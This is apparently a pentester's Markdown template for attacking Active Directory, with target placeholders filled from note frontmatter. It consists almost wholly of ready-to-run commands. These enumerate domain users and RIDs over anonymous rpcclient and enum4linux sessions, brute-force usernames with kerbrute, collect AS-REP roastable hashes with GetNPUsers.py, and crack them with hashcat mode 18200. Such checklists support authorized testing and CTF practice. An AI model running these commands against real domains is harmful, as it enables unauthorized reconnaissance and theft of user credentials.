# Active Dirctory
## User Enum

### Enum4Linux
```bash
enum4linux -U <% tp.frontmatter.dc_ip %>  | grep "user:" | awk -F'[][]' '{print $2}' > users
```

### RPCClient 
**Null session**
```bash
rpcclient -U "" -N <% tp.frontmatter.dc_ip %> -c 'enumdomusers' | awk -F'[][]' '{print $2}' > users
```

**If you would like all RIDs**
```bash
rpcclient -U "" -N <% tp.frontmatter.dc_ip %> -c 'enumdomusers' | awk -F'[][]' '{print $4}' > RIDs
```

**Query each user for additional information**
```
cat RIDs | while read rid; do rpcclient -U "" -N <% tp.frontmatter.dc_ip %> -c "queryuser $rid"; done
```

**Get all groups**
```bash
rpcclient -U "" -N <% tp.frontmatter.dc_ip %> -c 'enumdomgroups'
```

## Kerbrute
**Change wordlist if you  have put together a custom one**
```bash
kerbrute userenum -d <% tp.frontmatter.domain %> --dc <% tp.frontmatter.dc_ip %> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

## Attacking users

### GetNPUsers

```bash
GetNPUsers.py '<% tp.frontmatter.domain %>/' -usersfile users -format hashcat -outputfile hashes -dc-ip <% tp.frontmatter.dc_ip %>
```

### Hashcat
```bash
hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt
```

